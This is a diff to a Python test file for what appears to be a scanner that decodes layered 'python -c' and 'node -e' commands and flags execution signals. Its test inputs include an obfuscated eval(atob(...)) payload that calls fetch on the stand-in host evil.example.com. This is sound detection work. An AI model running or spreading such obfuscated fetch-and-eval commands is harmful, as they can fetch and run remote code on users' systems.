@@ -130,6 +130,13 @@ def test_python_c_argument_inspected_without_execution(tmp_path: Path) -> None:
     assert not canary.exists()
 
 
+def test_python_c_argument_without_space_is_inspected() -> None:
+    result = decode_layers("python -c\"exec('inline')\"")
+
+    assert any(layer.encoding == "python-c" for layer in result.layers)
+    assert result.exec_signals
+
+
 def test_node_e_argument_inspected_through_nested_atob() -> None:
     inner = "fetch('http://evil.example.com')"
     encoded = _b64(inner)
@@ -140,6 +147,16 @@ def test_node_e_argument_inspected_through_nested_atob() -> None:
     encodings = tuple(layer.encoding for layer in result.layers)
     assert "node-e" in encodings
     assert "js-atob" in encodings
+    assert result.final_text == inner
+
+
+def test_node_e_argument_without_space_is_inspected() -> None:
+    inner = "fetch('http://evil.example.com')"
+    encoded = _b64(inner)
+    result = decode_layers(f"node -e\"eval(atob('{encoded}'))\"")
+
+    assert any(layer.encoding == "node-e" for layer in result.layers)
+    assert any(layer.encoding == "js-atob" for layer in result.layers)
     assert result.final_text == inner
 
 
